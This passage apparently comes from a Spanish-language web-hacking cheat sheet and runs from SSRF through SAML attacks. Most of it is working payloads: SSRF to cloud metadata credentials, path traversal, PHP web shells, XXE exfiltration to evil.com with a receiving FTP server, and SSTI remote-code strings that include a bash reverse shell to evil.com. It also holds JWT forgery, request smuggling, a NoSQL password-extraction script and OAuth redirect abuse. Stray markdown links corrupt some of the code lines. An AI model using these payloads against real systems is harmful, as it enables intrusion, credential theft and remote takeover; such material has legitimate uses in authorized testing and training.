http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Alibaba
http://100.100.100.200/latest/meta-data/
```

### Internal Scanning

```bash
http://target.com/fetch?url=http://127.0.0.1:3306       # MySQL
http://target.com/fetch?url=http://127.0.0.1:6379       # Redis
http://target.com/fetch?url=http://127.0.0.1:9200       # ES
http://target.com/fetch?url=http://127.0.0.1:27017      # Mongo
http://target.com/fetch?url=http://127.0.0.1:5432       # PG
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20evil
http://target.com/fetch?url=dict://127.0.0.1:6379/INFO
```

### Bypass

```bash
http://0.0.0.0
http://localhost
http://0
http://[::1]
http://2130706433
http://0x7f000001
http://127.1
http://target.com/fetch?url=http://expected.com@127.0.0.1
```

<a name="directory-traversal"></a>
## 6. Directory Traversal

```bash
http://target.com/static/../../../etc/passwd
http://target.com/download?file=../../config.php

# Double URL encoding
http://target.com/..%252f..%252f..%252fetc/passwd

# UTF-8 overlong
http://target.com/..%c0%af..%c0%af..%c0%afetc/passwd

# Null byte (PHP < 5.3)
http://target.com/download?file=../../etc/passwd%00.jpg

# Bypass
....//....//....//etc/passwd
http://target.com/download?file=/etc/passwd
```

<a name="file-upload"></a>
## 7. File Upload

### Extensiones

```bash
shell.php shell.php3 shell.php4 shell.php5 shell.php7
shell.pht shell.phtml shell.phar shell.php.jpg
shell.asp shell.aspx shell.asa shell.cer
shell.jsp shell.jspx shell.jsv

# Case
shell.PhP shell.Php shell.PHP
```

### Bypass

```bash
Content-Type: image/jpeg
GIF89a; <?php system($_GET['cmd']); ?>
```

### .htaccess

```bash
AddType application/x-httpd-php .txt
# Subir shell.txt -> PHP
```

### Race Condition

```bash
# Terminal 1
while true; do curl -F "file=@shell.php" http://target.com/upload.php; done
# Terminal 2
while true; do curl http://target.com/uploads/shell.php?cmd=id; done
```

<a name="idor"></a>
## 8. IDOR - Insecure Direct Object Reference

```bash
http://target.com/profile?id=100
http://target.com/invoice?id=INV-200
GET /api/users/1234/documents
PUT /api/orders/5678/status
DELETE /api/users/567
/admin/edit/1 -> /admin/edit/2
```

### Bypass

```bash
# Method override
HEAD /api/users/1234
OPTIONS /api/users/1234

# Parameter pollution
/api/users?id=1234&id=5678

# Headers
X-Original-URL: /admin/users/1234
X-Forwarded-For: 127.0.0.1
```

<a name="xxe"></a>
## 9. XXE - XML External Entity (Completo)

### In-Band XXE - Lectura de Archivos

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root>&xxe;</root>
```

### SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<root>&xxe;</root>
```

### Blind Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

### Blind OOB XXE - DTD Exfiltracion

```xml
<!-- payload.xml -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
  %xxe;
]>
<root>test</root>

<!-- xxe.dtd en tu servidor -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>">
%eval;
%exfil;
```

### Blind OOB XXE - FTP Exfiltracion

```xml
<!-- xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://evil.com:2121/%file;'>">
%eval;
%exfil;
```

Servidor FTP para recibir:
```python
import socketserver
class F(socketserver.StreamRequestHandler):
    def handle(self):
        print(f'DATA: {self.rfile.readline()}')
s = socketserver.TCPServer(('0.0.0.0', 2121), F)
s.serve_forever()
```

### XXE en SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <rect fill="white" width="100" height="100"/>
  <text font-size="10" x="10" y="10">
    <tspan>&xxe;</tspan>
  </text>
</svg>
```

### XXE en SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header/>
  <soap:Body>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <getUser>
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### XXE en RSS/Atom

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>
```

### XXE en DOCX

```bash
# Office files are ZIP with XML inside
unzip document.docx -d docx_extracted/
# Inject XXE in word/document.xml
# Then repack:
cd docx_extracted && zip -r ../malicious.docx *
```

```python
import zipfile
with zipfile.ZipFile('original.docx', 'r') as z:
    data = {n: z.read(n) for n in z.namelist()}
xxe = '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<w:document>...</w:document>'
data['word/document.xml'] = xxe.encode()
with zipfile.ZipFile('malicious.docx', 'w') as zout:
    for n, c in data.items():
        zout.writestr(n, c)
```

### XXE en PDF/FDF

```xml
<?xml version="1.0"?>
<!DOCTYPE fdf [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<fdf>
  <fields>
    <field name="test">
      <value>&xxe;</value>
    </field>
  </fields>
</fdf>
```

### XXE en SAML

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <saml:Assertion>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

### Parameter Entities vs General Entities

```xml
<!-- General entity -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<root>&xxe;</root>

<!-- Parameter entity (solo en DTD) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>">
%eval;
<root>&exfil;</root>

<!-- External parameter entity -->
<!ENTITY % ext SYSTEM "http://evil.com/evil.dtd">
%ext;
```

### CDATA Injection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY full '%start;%file;%end;'>">
  %all;
]>
<root>&full;</root>
```

### XInclude (cuando no podes modificar el DTD)

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>

<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="xml" href="http://169.254.169.254/latest/meta-data/"/>
</root>
```

### PHP Wrappers en XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### jar: Protocol (Java XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:file:///var/www/html/app.war!/WEB-INF/web.xml">
]>
<root>&xxe;</root>
```

### Herramientas

```bash
# XXEServ
git clone https://github.com/enjoiz/XXEServ.git
[python](../raw/pyth0n-f0r-h4ck1ng.md) xxeserv.py -p 8080

# XXEinjector
java -jar XXEinjector.jar --host=evil.com --httpport=8080 --file=/etc/passwd
```

<a name="ssti"></a>
## 10. SSTI - Server-Side Template Injection (Completo)

### Deteccion Generica

```jinja2
{{7*7}}
${7*7}
#{7*7}
*{7*7}
<%= 7*7 %>
{{7*7}}49
{{7*'7'}} -> 7777777
```

### Jinja2 / Nunjucks (Python - Flask/Django)

```jinja2
# Deteccion
{{7*7}}
{{7*'7'}}

# Config dump
{{ config }}
{{ self }}
{{ request }}

# RCE via subprocess
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# RCE via builtins
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# File read
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# File write
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/s.php', 'w').write('<?php system($_GET["cmd"]);?>') }}

# Sandbox escape - listar subclasses
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Reverse shell
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/evil.com/4444 0>&1"').read() }}
```

### Twig (PHP - Symfony, Drupal 8+)

```twig
{{7*7}}
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
{{ ['cat /etc/passwd']|filter('system') }}
{{ ['id']|map('system') }}
{{ _self }}
```

### Freemarker (Java - Spring MVC)

```freemarker
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").exec("id")}

# File read
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}

# Info disclosure
${systemProperties}
${request}
```

### Smarty (PHP)

```smarty
{7*7}
{$smarty.version}
{system('id')}
{php}echo shell_exec('id');{/php}
{php}echo file_get_contents('/etc/passwd');{/php}
```

### Velocity (Java)

```velocity
#[set](../raw/ph1sh1ng.md#social-engineering-toolkit)($x = 7*7)
$x
#set($e = $x.class.forName("java.lang.Runtime"))
#set($y = $e.getMethod("getRuntime"))
#set($z = $y.invoke(null))
$z.exec("id")
```

### Mako (Python)

```mako
${7*7}
${self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}
${self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}
```

### Tornado (Python)

```tornado
{{7*7}}
{% import os %}{{ os.popen('id').read() }}
{{ handler.settings }}
```

### Go text/template y html/template

```go
{{.}}
{{"id" | exec}}   // solo si hay funciones registradas
```

### ERB (Ruby on Rails)

```erb
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read() %>
<%= File.open('/etc/passwd').read() %>
<%= ENV.to_h %>
```

### Jade / Pug (Node.js)

```jade
p= 7*7
- var x = require('child_process').execSync('id').toString()
p= x
- var fs = require('fs')
p= fs.readFileSync('/etc/passwd', 'utf8')
```

### Handlebars (Node.js)

```handlebars
{{7}}
[rce](../raw/w3b-h4ck1ng.md#rce) via prototype chain:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.split "constructor")}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (string.split.apply 0 codelist)}}
          {{this}}
        {{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Liquid (Shopify)

```liquid
{{ 7 | plus: 7 }}
{{ shop }}
{{ product }}
```

### tplmap - SSTI Automation

```bash
python tplmap.py -u "http://target.com/page?name=test" --os-cmd
python tplmap.py -u "http://target.com/page?name=test" --os-shell
python tplmap.py -u "..." --cookie="PHPSESSID=abc123" --os-cmd

ffuf -u "http://target.com/page?name=FUZZ" -w /usr/share/seclists/[fuzzing](../raw/fuzz1ng.md)/SSTI.txt -mr "49|7777777"
```

<a name="smuggling"></a>
## 11. HTTP Request Smuggling (Completo)

### CL.TE

Frontend usa Content-Length, backend usa Transfer-Encoding.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### TE.CL

Frontend usa TE, backend usa Content-Length.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Length: 15

x=1
0
```

### TE.TE Obfuscation

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:    chunked
transfer-encoding: chunked
Transfer-encoding: chunked
TRANSFER-ENCODING: chunked
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked, x
```

### HTTP/2 Downgrade Smuggling

```http
:method POST
:path /admin
:authority target.com
content-length: 0
transfer-encoding: chunked
```

### Connection Reuse Attacks

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 70
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Foo: bar
```

### Web Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 62
Transfer-Encoding: chunked

0

GET /poisoned HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

### Response Queue Poisoning

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 66
Transfer-Encoding: chunked

0

GET /hop HTTP/1.1
Host: target.com
Content-Length: 13

x=1
```

### Deteccion Automatica

```bash
# Smuggler.py
git clone https://github.com/defparam/smuggler.git
python smuggler.py -u http://target.com

# Burp Extension: HTTP Request Smuggler
# Turbo Intruder scripts incluidos
```

<a name="jwt"></a>
## 12. JWT Attacks

### None Algorithm

```python
import [jwt](../raw/4p1-s3cur1ty.md#jwt)
token = jwt.encode({"user": "admin"}, key="", algorithm="none")

# Manual
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({"user":"admin"}).encode()).rstrip(b'=').decode()
token = f"{h}.{p}."
```

### Algorithm Confusion (RS256 -> HS256)

```python
public_key = open("public.pem").read()
token = jwt.encode({"user": "admin"}, public_key, algorithm="HS256")
```

### Weak Secret (HS256)

```bash
[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) -m 16500 jwt.txt rockyou.txt
jwt_tool jwt.txt -C -d rockyou.txt
jwt-cracker -token "eyJ..." -wordlist rockyou.txt
```

### JKU / KID Injection

```python
token = jwt.encode({"user": "admin"}, private_key, algorithm="RS256",
    headers={"jku": "https://attacker.com/jwks.json"})

# KID path traversal
"kid": "../../etc/passwd"
"kid": "/dev/null"
"kid": "keys' UNION SELECT 'aaa' --"
```

### JWK Header Injection

```python
from [cryptography](../raw/crypt0-f0r-h4ck3rs.md).hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa)
private_key = rsa.generate_private_key(65537, 2048)
public_jwk = json.loads(private_key.public_key().public_bytes(...))
token = jwt.encode({"user": "admin"}, private_key, algorithm="RS256",
    headers={"jwk": public_jwk})
```

### jwt_tool

```bash
jwt_tool <token> -T                     # tamper
jwt_tool <token> -I -pc name -pv admin  # inject [payload](../raw/m3t4spl01t.md#payloads)
jwt_tool <token> -C -d rockyou.txt      # crack
jwt_tool <token> -X a                   # none attack
jwt_tool <token> -X h                   # HMAC confusion
jwt_tool <token> -X k                   # KID injection
```

<a name="graphql"></a>
## 13. GraphQL Attacks

### Introspection

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
      }
    }
  }
}

{
  __schema {
    mutationType {
      fields { name args { name type { name } } }
    }
  }
}
```

### SQLi via GraphQL

```graphql
{
  user(id: "1' OR '1'='1") {
    name email password
  }
}

query($id: String!) { user(id: $id) { name } }
# {"id": "1' OR '1'='1"}
```

### NoSQLi via GraphQL

```graphql
{
  login(username: "admin", password: {"$ne": ""}) { token }
  search(query: {"$regex": ".*"}) { results { title } }
}
```

### Batching Attack

```graphql
[
  {"query": "{ login(user: \"admin\", pass: \"1234\") { token } }"},
  {"query": "{ login(user: \"admin\", pass: \"admin\") { token } }"},
  {"query": "{ login(user: \"admin\", pass: \"test\") { token } }"}
]
```

### Depth DoS

```graphql
{
  user(id: 1) { friends { friends { friends { friends { name } } } } }
}
```

### Tools

```bash
# InQL - Burp extension
# GraphQL Voyager
npx [graphql](../raw/4p1-s3cur1ty.md#graphql)-voyager http://target.com/[graphql](../raw/4p1-s3cur1ty.md#graphql)

# graphw00f
python graphw00f.py -d http://target.com/graphql

# GraphQLmap
python graphqlmap.py -u http://target.com/graphql
graphql > SCHEMA
graphql > DUMP
```

<a name="nosql"></a>
## 14. NoSQL Injection

### MongoDB

```json
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "$where": "sleep(5000)"}
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}], "password": {"$ne": ""}}
```

### MongoDB - Automatization

```python
import requests, string
url = "http://target.com/login"
chars = string.ascii_lowercase + string.digits
password = ""
for i in range(20):
    for c in chars:
        r = requests.post(url, json={"username": "admin", "password": {"$regex": f"^{password}{c}"}})
        if "success" in r.text:
            password += c
            break
print(f"Password: {password}")
```

### CouchDB

```json
{"selector": {"password": {"$regex": "^a"}}}
```

### NoSQLMap

```bash
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py
```

<a name="tools"></a>
## 15. Herramientas de Automatizacion

### Nuclei

```bash
nuclei -u http://target.com
nuclei -u http://target.com -t cves/ -t exposures/ -t misconfiguration/
nuclei -u http://target.com -s critical,high
nuclei -u http://target.com -rl 50
nuclei -u http://target.com -json -o results.json
nuclei -u http://target.com -proxy http://127.0.0.1:8080
```

### ffuf

```bash
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/[dirb](../raw/w3b-h4ck1ng.md#dirbusting)/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.asp,.txt
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt
ffuf -u http://target.com/page?FUZZ=test -w params.txt
ffuf -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -w rockyou.txt -fc 401
ffuf -u http://target.com/admin -H "X-Forwarded-For: FUZZ" -w [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips).txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234
```

### nikto

```bash
[nikto](../raw/w3b-h4ck1ng.md#nikto) -h http://target.com
nikto -h https://target.com -[ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))
nikto -h http://target.com -id admin:password
nikto -h http://target.com -o report.html -Format html
```

### Gobuster / wfuzz

```bash
[gobuster](../raw/w3b-h4ck1ng.md#gobuster) dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w directory-list-2.3-medium.txt -x php,txt,html
gobuster dns -d target.com -w subdomains.txt
gobuster vhost -u http://target.com -w vhosts.txt

wfuzz -c -z file,wordlist.txt http://target.com/page?FUZZ=test
wfuzz -c -z file,users.txt -z file,pass.txt http://target.com/login -d "user=FUZZ&pass=FUZ2Z"
```

<a name="api-testing"></a>
## 16. API Security Testing

### Metodologia REST API

```bash
# GET - recolectar info publica
GET /api/users
GET /api/users/1234
GET /api/v2/users?page=1&limit=100

# POST - crear recursos (probar inyecciones)
POST /api/users
{"name": "test' OR '1'='1", "email": "test@test.com"}

# PUT - reemplazar recursos (probar mass assignment)
PUT /api/users/1234
{"role": "admin", "balance": 999999}

# PATCH - actualizar parcial
PATCH /api/users/1234
{"isAdmin": true}
{"email": "attacker@evil.com"}

# DELETE - probar IDOR
DELETE /api/users/567

# OPTIONS - descubrir metodos
OPTIONS /api/users
OPTIONS /api/admin

# HEAD - bypass de auth checks
HEAD /api/admin/secrets
```

### Mass Assignment / Property Injection

```http
POST /api/users
Content-Type: application/json

{
    "username": "test",
    "password": "test123",
    "is_admin": true,
    "role": "admin",
    "balance": 9999999,
    "email_verified": true
}
```

### Path Traversal en Endpoints

```bash
/api/users/../../../etc/passwd
/api/users/..;/etc/passwd
/api/..%2f..%2f..%2fetc/passwd
/api/v1/../../v2/admin
/api/../admin/users
```

### API Authentication Testing

```bash
# API keys
X-API-Key: test123
X-API-Key: 00000000-0000-0000-0000-000000000000
X-API-Key: ' OR '1'='1
Authorization: Bearer test123
Authorization: Api-Key test123

# JWT en APIs
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# OAuth2 Bearer
Authorization: Bearer <token>
Authorization: Bearer <token>@admin
```

### OAuth2 Flow Testing

```http
# Authorization Code
GET /[oauth](../raw/hybr1d-1d3nt1ty.md#oauth)/authorize?response_type=code&client_id=app&redirect_uri=https://evil.com&scope=admin

# Client Credentials
POST /oauth/token
{"grant_type": "client_credentials", "client_id": "admin", "client_secret": "secret"}

# Resource Owner Password
POST /oauth/token
{"grant_type": "password", "username": "admin", "password": "admin123"}
```

### Rate Limiting Bypass

```bash
# Headers de IP
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Real-[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip): 1.1.1.1
X-Originating-IP: 1.1.1.1
Forwarded: for=1.1.1.1

# Rotacion de IPs
ffuf -u "http://target.com/api/login" -X POST -d "user=admin&pass=admin" -H "X-Forwarded-For: FUZZ" -w ips.txt

# Delayed requests
for i in $(seq 1 100); do curl -s "http://target.com/api/endpoint"; sleep 0.5; done

# Tor rotation
curl --socks5 127.0.0.1:9050 "http://target.com/api/endpoint"
```

### API Versioning Attacks

```bash
# Versiones viejas = bugs viejos
/api/v1/users
/api/v2/users
/api/v1.0/users
/api/v0.1/users

# Version via header
Accept: application/vnd.target.v1+json
Accept: application/vnd.target.v2+json

# Version via query param
/api/users?version=1
/api/users?api_version=1.0
```

### gRPC API Testing

```bash
# grpcurl
grpcurl -plaintext target.com:443 list
grpcurl -plaintext target.com:443 describe
grpcurl -plaintext -d '{"user_id": 1}' target.com:443 user.UserService/GetUser
grpcurl -plaintext -H "authorization: bearer token" -d '{}' target.com:443 admin.AdminService/ListUsers

# Inyeccion en gRPC
grpcurl -plaintext -d '{"query": "1'"'"' OR '"'"'1'"'"'='"'"'1"}' target.com:443 search.SearchService/Search

# Protobuf analysis
protoc --decode_raw < response.bin
protoc --decode=UserService.GetUser user.proto < response.bin
```

### SOAP API Testing

```bash
POST /services/UserService
Content-Type: text/xml

<?xml version="1.0"?>
<soap:Envelope>
  <soap:Body>
    <getUser>
      <userId>1' OR '1'='1</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>

# SOAP XXE
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<getUser><userId>&xxe;</userId></getUser>

# WSDL enumeration
GET /services/UserService?wsdl
GET /service?wsdl
GET /soap?wsdl

# SOAPAction spoofing
SOAPAction: "urn:AdminService/DeleteAllUsers"
SOAPAction: ""
```

### Serverless API Testing

```bash
# AWS Lambda event injection
POST /api/upload
{"filename": "../../etc/passwd", "content": "test"}

# Lambda environment leak
GET /api/error  # si muestra process.env

# Lambda SSRF a metadata
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Azure Functions
GET /api/function?code=test
GET /api/function?code=master
```

### Swagger/OpenAPI Discovery

```bash
# Endpoints comunes
/api/swagger.json
/api/swagger.yaml
/api/v1/swagger.json
/api/v2/swagger.json
/api/openapi.json
/swagger.json
/swagger/ui/index.html
/swagger-resources
/api/docs
/api/doc
/api/documentation
/.well-known/openid-configuration
```

<a name="oauth"></a>
## 17. OAuth 2.0

### Authorization Code Flow Exploitation

```http
# Flujo normal
GET /oauth/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback&scope=openid+profile&state=abc123

# Ataque: interceptar el codigo
# Si el redirect_uri no se valida bien:
GET /oauth/authorize?response_type=code&client_id=app&redirect_uri=https://evil.com/&state=abc123

# CSRF en OAuth - sin state parameter
GET /oauth/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback
# El atacante hace que la victima haga click en este link
# El codigo resultante se envia al callback del atacante
```

### Redirect URI Manipulation

```http
# Open redirectors aceptados como redirect_uri
https://app.com/callback?next=https://evil.com
https://app.com/callback#https://evil.com
https://app.com/callback/../evil.com
https://app.com/callback.evil.com
https://app.com/callback@evil.com
https://app.com:443@evil.com

# Path traversal en redirect_uri
https://app.com/oauth/callback/../../../evil.com

# Subdominio malicioso
https://evil.app.com/callback

# Fragment manipulation
https://app.com/callback#@evil.com
```

### State Parameter CSRF

```http
# Sin state parameter -> CSRF en OAuth
# El atacante puede vincular su cuenta con la victima

# Robar el state de la victima
# Si es predecible (timestamp, hash debil, secuencial)
GET /oauth/authorize?response_type=code&client_id=app&state=12345
GET /oauth/authorize?response_type=code&client_id=app&state=12346
```

### Authorization Code Injection

```http
# Si el code se puede interceptar (logs, referrer, historial)
# O si no esta vinculado al client_id original
POST /oauth/token
grant_type=authorization_code
code=STOLEN_CODE
redirect_uri=https://app.com/callback
client_id=ATTACKER_CLIENT

# Code reutilizable (sin one-time use check)
POST /oauth/token
grant_type=authorization_code
code=SAME_CODE
# Se puede usar multiples veces
```

### Implicit Flow Deprecation Issues

```http
# Implicit grant (response_type=token)
# Deprecado por OAuth 2.1 pero muchos todavia lo usan
GET /oauth/authorize?response_type=token&client_id=app&redirect_uri=https://evil.com

# El token va en el fragment de la URL
# El historial del navegador, referrer, logs pueden leakearlo

# Access token en logs del servidor
# Referrer header leaks
# Malas practicas: token en URL de callback
```

### Client Credentials Abuse

```http
# Si el client_secret es debil o default
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&client_id=swagger&client_secret=swagger

grant_type=client_credentials&client_id=admin&client_secret=admin

grant_type=client_credentials&client_id=test&client_secret=test123

# Client credentials en mobile apps (reverse engineering)
# Extraer client_secret del APK/IPA
```

### Refresh Token Rotation Bypass

```http
# Refresh token robbery
POST /oauth/token
grant_type=refresh_token
refresh_token=STOLEN_REFRESH_TOKEN

# Si no hay rotation, el mismo refresh token se puede reusar
# Si hay rotation pero no hay revocation del anterior...

# Reuse detection bypass
# Probar con small delays entre usos
```

### Scope Escalation via Token Swap

```http
# Scope swapping
POST /oauth/token
grant_type=authorization_code
code=VALID_CODE
scope=openid+profile+email+admin+write

# Si el server no verifica que el scope este autorizado por el usuario

# Probar todos los scopes posibles
scope=admin
scope=admin+write
scope=*
scope=all
scope=full_access
```

### PKCE Bypass Techniques

```http
# PKCE (Proof Key for Code Exchange) - S256 o plain
# Bypass si el server no verifica el code_challenge

# Sin PKCE cuando deberia tenerlo
GET /oauth/authorize?response_code=code&client_id=app&redirect_uri=https://app.com/callback

# PKCE con challenge debil
code_challenge=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

# PKCE con S256 -> plain downgrade
code_challenge_method=plain
code_challenge=EASYTOGUESS

# Reutilizar code_verifier
# Si el mismo verifier se usa siempre
```

### Consent Screen Injection

```http
# XSS en consent screen
# Si el nombre de la app tiene XSS:
client_name=<script>alert(1)</script>

# Si la descripcion de la app tiene XSS:
client_description=<img src=x onerror=alert(1)>

# Phishing en consent screen
# Hacer que la pantalla de consentimiento se vea como login normal
# El usuario autoriza sin saber

# Consent screen sin detalles
GET /oauth/authorize?response_type=code&client_id=app
# Sin mostrar scopes ni info de la app
```

### OAuth Tools

```bash
# oauth2-proxy
# Burp extension: OAuth Scan
# https://oauth.net/2/playground/

# Script para testear redirect_uri
for uri in $(cat redirect_uris.txt); do
    curl -v "http://target.com/oauth/authorize?response_type=code&client_id=app&redirect_uri=$uri&scope=openid&state=test"
done

# Probar diferentes grant types
for gt in authorization_code implicit password client_credentials; do
    curl -X POST "http://target.com/oauth/token" -d "grant_type=$gt&client_id=admin&client_secret=admin"
done
```

<a name="saml"></a>
## 18. SAML / SSO

### SAML XML Signature Wrapping (XSW)

```xml
<!-- Ataque: wrapper alrededor de la firma -->
<samlp:Response>
  <saml:Assertion ID="real">
    <saml:Subject>admin@target.com</saml:Subject>
    <ds:Signature>...</ds:Signature>
  </saml:Assertion>
  <!-- Wrapper payload - la firma valida el wrapper -->
  <saml:Assertion ID="fake">
    <saml:Subject>attacker@evil.com</saml:Subject>
  </saml:Assertion>
</samlp:Response>

# Variantes de XSW
# 1. Wrapper alrededor del element firmado
# 2. Mover la firma a otro element
# 3. Duplicar IDs
# 4. Modificar elementos fuera de la firma
```

### SAML Response Tampering

```xml
<!-- Modificar atributos sin invalidar la firma -->
<saml:Attribute Name="role">
